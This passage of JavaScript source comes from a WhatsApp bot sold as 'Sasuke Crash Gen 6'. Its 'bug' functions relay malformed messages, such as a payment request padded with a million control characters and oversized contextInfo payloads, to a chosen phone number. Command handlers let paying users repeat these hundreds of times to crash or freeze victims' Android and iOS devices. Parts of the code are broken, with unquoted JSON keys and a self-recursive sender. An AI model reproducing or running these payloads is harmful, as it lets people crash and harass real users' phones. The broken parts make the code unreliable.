    caption: `Sasuke Crash Gen 6🐉〽️                                                                                                                                                                                                                                                ${teksbug2}`
  }, {quoted: qkontak});
}

async function wraperOsXjustin(X, show) {
    let push = [];
    const startTime = Date.now();
    const totalDurationMs = 10000; // contoh durasi (ubah sesuai kebutuhan)
    let count = 0;
    let ptcp = false; // kalau partisipan diset

    for (let i = 0; i < 10; i++) {
        push.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: " ",
                hasMediaAttachment: true,
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                    fileLength: "18352",
                    height: 720,
                    width: 1280,
                    mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c="
                }
            })
        });
    }

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Pengiriman Selesai Sesuai Durasi Yang Ditentukan.");
            return;
        }

        if (count < 10) {
            await wraperOsXjustin(X, false);
            await langgxyz.relayMessage(X, {
                "extendedTextMessage": {
                    "text": "🩸저스틴JustinOfficial🔥̤",
                    "contextInfo": {
                        "splashscreen": "1234567890ABCDEF",
                        "participant": "6281572074859@s.whatsapp.net",
                        "quotedMessage": {
                            "callLogMesssage": {
                                "isVideo": true,
                                "callOutcome": "1",
                                "durationSecs": "0",
                                "callType": "REGULAR",
                                "participants": [{
                                    "jid": "6281572074859@s.whatsapp.net",
                                    "OutCrash": "1"
                                }]
                            }
                        },
                        "remoteJid": X,
                        "conversionSource": "source_example",
                        "conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                        "conversionDelaySeconds": 10,
                        "forwardingScore": 9999999,
                        "isForwarded": true,
                        "quotedAd": {
                            "advertiserName": "Example Advertiser",
                            "mediaType": "IMAGE",
                            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                            "caption": ""
                        },
                        "placeholderKey": {
                            "remoteJid": "6281572074859@s.whatsapp.net",
                            "fromMe": false,
                            "id": "ABCDEF1234567890"
                        },
                        "expiration": 86400,
                        "ephemeralSettingTimestamp": "1728090592378",
                        "ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                        "externalAdReply": {
                            "title": "Marga Official",
                            "body": "Justin Is Heree",
                            "mediaType": "VIDEO",
                            "renderLargerThumbnail": true,
                            "previewTtpe": "VIDEO",
                            "thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                            "sourceType": "x",
                            "sourceId": "x",
                            "sourceUrl": "https://www.instagram.com/justinofficial",
                            "mediaUrl": "https://www.instagram.com/justinofficial",
                            "containsAutoReply": true,
                            "renderLargerThumbnail": true,
                            "showAdAttribution": true,
                            "ctwaClid": "ctwa_clid_example",
                            "ref": "ref_example"
                        },
                        "entryPointConversionSource": "entry_point_source_example",
                        "entryPointConversionApp": "entry_point_app_example",
                        "entryPointConversionDelaySeconds": 5,
                        "disappearingMode": {},
                        "actionLink": {
                            "url": "https://www.instagram.com/justinofficial"
                        },
                        "groupSubject": "Example Group Subject",
                        "parentGroupJid": "6281572074859-1234567890@g.us",
                        "trustBannerType": "trust_banner_example",
                        "trustBannerAction": 1,
                        "isSampled": false,
                        "utm": {
                            "utmSource": "utm_source_example",
                            "utmCampaign": "utm_campaign_example"
                        },
                        "forwardedNewsletterMessageInfo": {
                            "newsletterJid": "6281572074859-1234567890@g.us",
                            "serverMessageId": 1,
                            "newsletterName": "X",
                            "contentType": "UPDATE",
                            "accessibilityText": "X"
                        },
                        "businessMessageForwardInfo": {
                            "businessOwnerJid": "0@s.whatsapp.net"
                        },
                        "smbClientCampaignId": "smb_client_campaign_id_example",
                        "smbServerCampaignId": "smb_server_campaign_id_example",
                        "dataSharingContext": {
                            "showMmDisclosure": true
                        }
                    }
                }
            }, ptcp ? {
                participant: {
                    jid: X
                }
            } : {});
            console.log(chalk.green("🩸JustinUi System Attack wraper-osXjustin ♻️"));
        }
    };

    await sendNext();
}
        async function VampPaymentCrash(target, Ptcp = true) {
    await langgxyz.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Vampire.biz.net",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramsJson: "\u0003".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}
//fungsi pemanggilan
async function Sasuke(target) {
    for (let i = 0; i <= 120; i++) {
    await JustinXFlowButton(target)
    await Xbeta(target, true)
    }
}
        

// END FUNC BUG

// Func Auto Vn
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
await langgxyz.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

        switch (command) {
        

case "bugmenu": {
langgxyz.sendMessage(m.chat, { react: { text: "〽️", key: m.key } });

await loading()
let mbut = `
*Haii @${m.sender.split("@")[0]}, Welcome To Sasuke Crash Gen 6*

  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
=> Developer : Erlangga Developer
=> Action : ẉ.ceo/ErlanggaDeveloper
=> Gen : Gen 6
=> ⏳ Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
=> 🖥️ Uptime VPS : ${runtime(os.uptime())}
=> 📌 Total Fitur : ${totalFitur()}
=> Status : ${langgxyz.public ? "Public" : "Self"}

\`List Menu Bug\`
=> xbeta-v2
=> protocol-v2
=> delaymaker-v2
=> ui-v2
=> payload
=> blankv5
=> invisible-homev2
=> overbussines-v2
=> ioscrash-v2
=> bughard-v2
=> hardcombo-v2

> *Penggunaan Bug?, ketik ultimate-sasuke 62xxx*
`;
langgxyz.sendMessage(m.chat, {
  image: poto,
  caption: mbut,
  footer: "Developer Erlangga",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Sasuke Crash Gen 6`,
            "body": `© Erlangga Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Erlangga Official`,
            "thumbnail": fs.readFileSync('./all/media/MargaXyz.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".owner", 
    buttonText: { 
      displayText: 'Owner' 
    }
  }, {
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
  },
     {
    buttonId: ".ownermenu", 
    buttonText: {
      displayText: "Menu Owner"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: qmime })
}
                break
 case 'ultimate-sasuke': {
 langgxyz.sendMessage(m.chat, { react: { text: "💢", key: m.key } });
 
if (!isPremium) return Reply("*You are not a Premium User*");
    if (!q) return Reply("Example Usage:\n .ultimate-sasuke 62xx / @tag");

    let target = q.replace(/[^0-9]/g, "");
    
    if (target.startsWith('0')) {
        return Reply(`The number starts with '0'. Replace it with the country code number.\n\nExample: .ultimate-sasuke 62 xxx-xxxx-xxxx`);
    }

    let pepec = `${target}@s.whatsapp.net`;
    
  langgxyz.sendMessage(m.chat, {
  caption: "Erlangga Developer", 
  image: marga,
  footer: "Sasuke Gen 6",
  buttons: [
    { 
      buttonId: `.script`, 
      buttonText: {
      displayText: 'Buy Script'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.owner', 
      buttonText: {
      displayText: 'owner'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.h kontol', 
      buttonText: {
      displayText: 'Ping' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "S̵̶̮̬͖̄͑͟E̸̖̪̱͚ͨ̀͜L̳͈͉̅̊E̸̖̪̱͚ͨ̀͜C̸̣̭͖̤̒̈͊͟T̷̫͉̰͕̒́ B̟̈́̆̐̄̚͜U̸̫̠̰͈̕T̷̫͉̰͕̒́T̷̫͉̰͕̒́O̵̷̪̰ͩ͆ͅN̰̜͉͔ͬ̽͢",
        "sections": [
            {
                "title": "© ErlanggaOfficial",
                "highlight_label": "Rekomendasi",
                "rows": [
                    {
                        "header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Beta New",
                        "description": "Attack beta",
                        "id": ".xbeta-v2 ${target}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Ui",
                        "description": "Attack Ui",
                        "id": ".ui-v2 ${target}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Attack Home",
                        "description": "Attack Home",
                        "id": ".payload ${target}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Blank Andro",
                        "description": "blank android",
                        "id": ".blankv5 ${target}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Invisible Samsung",
                        "description": "Invisible Home For Samsung",
                        "id": ".invisible-homev2 ${target}"
                    },
                    {
                        "header": "𝐅𝐨𝐫 𝐈𝐩𝐡𝐨𝐧𝐞",
                        "title": "Attack Businnes Iphone",
                        "description": "Attack Iphone",
                        "id": ".overbusinnes-v2 ${target}"
                    },
                                        {
                        "header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Delay Maker",
                        "description": "Delay Maker Parah",
                        "id": ".delaymaker-v2 ${target}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Attack Hard",
                        "description": "Bug Hard For Andro",
                        "id": ".bughard-v2 ${target}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Hard Combo",
                        "description": "Hard Combo Function",
                        "id": ".hardcombo-v2 ${target}"
                    },
                    {
                        header": "For Ios",
                        "title": "Attack Ios",
                        "description": "Crash Ios",
                        "id": ".ioscrash-v2 ${target}"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qmime });
}
break
case 'xbeta-v2': case 'ui-v2': case 'payload': case 'blankv5': case 'invisble-homev2': case 'overbusinnes-v2':{
if (!isCreator & !isPremium) return Reply(mess.murbug)
if (!q) return Reply(`Syntax Error\nKetik: ${prefix + command} 62xxx`)
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
Reply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
if (target === blockedNum) {
	Reply('Ngapain Dek?, Mau Ngebug Developer? Lawak😹');
	}
	// Memulai Pengiriman Bug Sesuai Jumlah
     for (let i = 0; i < 290; i++) { 
     await Sasuke(target)
     }
};
break
case 'delaymaker-v2': case 'bughard-v2': case 'hardcombo-v2': case 'ioscrash-v2':{
if (!isCreator & !isPremium) return Reply(mess.murbug)
if (!q) return Reply(`Syntax Error\nKetik: ${prefix + command} 62xxx`)
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
Reply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
if (target === blockedNum) {
	Reply('Mau Ngebug Developer? Lawak😹');
	}
	// Memulai Pengiriman Bug Sesuai Jumlah
     for (let i = 0; i < 300; i++) { 
    await Sasuke(target)
     }
};
    break
    case 'hai':{
if (!isCreator & !isPremium) return Reply(mess.murbug)
if (!q) return Reply(`Syntax Error\nKetik: ${prefix + command} 62xxx`)
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
Reply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
if (target === blockedNum) {
	Reply('Mau Ngebug Developer? Lawak😹');
	}
	// Memulai Pengiriman Bug Sesuai Jumlah
     for (let i = 0; i < 25; i++) { 
    await VampPaymentCrash(target, Ptcp = true) 
     }
};
                break
case "sasuke":{

langgxyz.sendMessage(m.chat, { react: { text: "〽️", key: m.key } });

await loading()
let mbut = `
*Haii @${m.sender.split("@")[0]}, Welcome To Sasuke Crash Gen 6 Berikut Menu Sasuke Crash*

=> Developer : Erlangga Developer
=> Action : ẉ.ceo/ErlanggaDeveloper
=> Gen : Gen 6
=> ⏳ Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
=> 🖥️ Uptime VPS : ${runtime(os.uptime())}
=> 📌 Total Fitur : ${totalFitur()}
=> Status : ${langgxyz.public ? "Public" : "Self"}

`
let buttons = [
            { buttonId: ".tqto", buttonText: { displayText: "Thanks To" } },
            { buttonId: ".owner", buttonText: { displayText: "Owner" } }
    ];

    let buttonMessage = {
        image: { 
            url: 'https://files.catbox.moe/ggjkbc.jpg',
            gifPlayback: true 
        },
        caption: mbut,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363409054020546@newsletter", 
                newsletterName: "𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐄𝐫𝐥𝐚𝐧𝐠𝐠𝐚"
            }
        },
        footer: "© Erlangga Official",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title:  "Silahkan Pilih Menu Yang Tersedia",
                    sections: [
                        {
                            title: "𝚂𝚎𝚕𝚎𝚌𝚝 𝚃𝚒𝚙𝚎 𝚋𝚞𝚐",
                            highlight_label: "Powered By Erlangga Developer",
                            rows: [
                                { title:  "Bugmenu", description: "Menu Bug", id: `.bugmenu` },
                                  { title: "Ownermenu", description: "Fitur Owner", id: `.ownermenu` },
                                   { title: "Fun Menu", description: "Fitur Fun", id: `.funmenu` },
                                                                      { title: "Group Menu", description: "Fitur Group", id: `.groupmenu` }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await langgxyz.sendMessage(m.chat, buttonMessage, { quoted: PayX });
};
break
case "funmenu": {
await loading()
let anjg = `
*Haii @${m.sender.split("@")[0]}, Welcome To Sasuke Crash Gen 6*

  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
=> Developer : Erlangga Developer
=> Action : ẉ.ceo/ErlanggaDeveloper
=> Gen : Gen 6
=> ⏳ Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
=> 🖥️ Uptime VPS : ${runtime(os.uptime())}
=> 📌 Total Fitur : ${totalFitur()}
=> Status : ${langgxyz.public ? "Public" : "Self"}


\`List Menu Fun\`
=> sticker
=> play
=> tiktok
=> brat
=> bratvid
=> bokep
=> tourl
=> motivasi
=> hd
=> pin
=> play
`;
langgxyz.sendMessage(m.chat, {
  image: poto,
  caption: anjg,
  footer: "Developer Erlangga",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Sasuke Crash Gen 6`,
            "body": `© Erlangga Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Erlangga Official`,
            "thumbnail": fs.readFileSync('./all/media/MargaXyz.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".owner", 
    buttonText: { 
      displayText: 'Owner' 
    }
  }, {
    buttonId: ".script", 
    buttonText: {
      displayText: "Buy Script"
    }
   },
   {
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
   }
],
  viewOnce: true,
  headerType: 6
}, { quoted: qmime })
}
break
case "menu": {
await loading()
let babi = `
*Haii @${m.sender.split("@")[0]}, Ini Adalah Bot Add Scruity 

  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
=> Developer : Erlangga Developer
=> Action : ẉ.ceo/ErlanggaDeveloper
=> Gen : Gen 6
=> ⏳ Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
=> 🖥️ Uptime VPS : ${runtime(os.uptime())}
=> 📌 Total Fitur : ${totalFitur()}
=> Status : ${langgxyz.public ? "Public" : "Self"}


\`List Menu Owner\`
=> addmurbug
=> delmurbug
=> bugmenu
=> debug
=> self
=> public
=> hidetag
=> addcase
=> getcase
=> nikktp
=> $
=> >
`;
langgxyz.sendMessage(m.chat, {
  image: poto,
  caption: babi,
  footer: "Developer Erlangga",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Sasuke Crash Gen 6`,
            "body": `© Erlangga Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Erlangga Official`,
            "thumbnail": fs.readFileSync('./all/media/MargaXyz.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".owner", 
    buttonText: { 
      displayText: 'Owner' 
    }
  }, {
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
   }
],
  viewOnce: true,
  headerType: 6
}, { quoted: qmime })
}
break
case "addmurbug":{
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return Reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285179836603`)
anj = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await langgxyz.onWhatsApp(anj)
if (ceknya.length == 0) return Reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(anj)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
Reply(`Nomor ${anj} Telah Menjadi murbug!`)
}
break
case 'delmurbug': {
    if (!isCreator) return Reply("𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲");
    if (args.length < 1) return Reply(`Use :\n*#delmurbug* @tag\n*#delmurbug* number`);

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium));
        }
        Reply("Delete success");
    } else {
        premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
        fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium));
        Reply("Success");
    }
}
break
case "addseller":{
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return Reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxx`)
anj = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await langgxyz.onWhatsApp(anj)
if (ceknya.length == 0) return Reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
reseller.push(anj)
fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
Reply(`Nomor ${anj} Telah Menjadi Reseller!`)
}
break
case 'delseller': {
    if (!isCreator) return Reply(mess.owner)
if (!args[0]) return Reply(`Penggunaan ${prefix+command} Nomer\nContoh ${prefix+command} 6283148534432`)
bro = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = reseller.indexOf(bro)
reseller.splice(unp, 1)
fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
Reply(`Nomor ${bro} Telah Di Hapus Reseller!`)
}
break
            case "self":{
                if (!isCreator) return Reply("`𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲`") 
                langgxyz.public = false
                Reply(`successfully changed to ${command}`)
            }
            break
                        case "public":{
                if (!isCreator) return Reply("`𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲`") 
                langgxyz.public = true
                Reply(`successfully changed to ${command}`)
            }
            break
            case "h":
            case "hidetag": {
                if (!m.isGroup) return Reply(mess.group)
                if (!isAdmins && !isCreator) return Reply(mess.admin)
 if (!q) return Reply(`Teks nya mana dongo`);
                if (m.quoted) {
                    langgxyz.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    langgxyz.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: m })
                }
            }
            break
                
                case 'debug': {
	if (!isCreator) return Reply(mess.owner)
	if (!m.quoted) return Reply('Reply Message!')
	await SasukeDebug(quoted);
	}
	break
              case "backup":{
if (!isCreator) return Reply(mess.owner);
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await langgxyz.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break
      case 'script': case 'sc': {
let buy = `
*\`▧ 「 SCRIPT SASUKE」\`*
╭────────────────━
┃友 *\`MAU BELI SC INI?\`*
┃
┃- *SASUKE CRASH GEN 6*
┃
┃友 *Chat 1 : https://wa.me/6282137392620*
┃友 *Telegram : https://t.me/langgxyz2*
╰────────────────━`
langgxyz.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 50000000,
 requestFrom: `@${m.sender.split('@')}`,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
}
break        
    case 'tqto': {
let buy = `
*\`▧ 「 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 𝗠𝗬 𝗙𝗥𝗜𝗘𝗡𝗗𝗦 」\`*

- Erlangga Official [ Developer ]
- Daffa [ My Friends ]
- Langit [ Friends ]
- Dannz Official [ Best Friends ]
- Ortu [ Support ]
- Dapz [ My Friends ]
- Thx To Allah [ My Good ]`
langgxyz.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'THANKS TO',
 amount1000: 'FRIENDS',
 requestFrom: `@${m.sender.split('@')}`,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})

}
                break
                case 'brat': {
  if (!text) return Reply("𝗜𝗻𝗽𝘂𝘁 𝗬𝗼𝘂𝗿 𝗧𝗲𝘅𝘁");

  async function brat(text) {
    try {
      const axios = require('axios');
      const res = await axios.get("https://brat.caliphdev.com/api/brat", {
        params: { text },
        responseType: "arraybuffer"
      });
      const image = Buffer.from(res.data);
      if (image.length <= 10240) throw new Error("Gagal generate brat");
      return image;
    } catch (e) {
      throw new Error(e.message || "Error tidak dikenal");
    }
  }

  try {
    const buf = await brat(text);
    const { writeFile } = require("fs/promises");
    const tempFile = "./temp-brat.png";

    await writeFile(tempFile, buf);

    const sticker = new Sticker(tempFile, {
      pack: global.author,
      author: global.packname,
      type: "full",
      categories: ['〽️'],
    });

    await langgxyz.sendMessage(m.chat, await sticker.toMessage());
  } catch (e) {
    Reply(`Error: ${e.message}`);
  }
}
break
            case "tourl": {
if (!/image/.test(mime)) return Reply(example("𝗥𝗲𝗽𝗹𝘆/𝗞𝗶𝗿𝗶𝗺 𝗙𝗼𝘁𝗼"))
let media = await langgxyz.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Erlangga.png');

let teks = directLink.toString()
await langgxyz.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break
case "hidetag":
case "z":
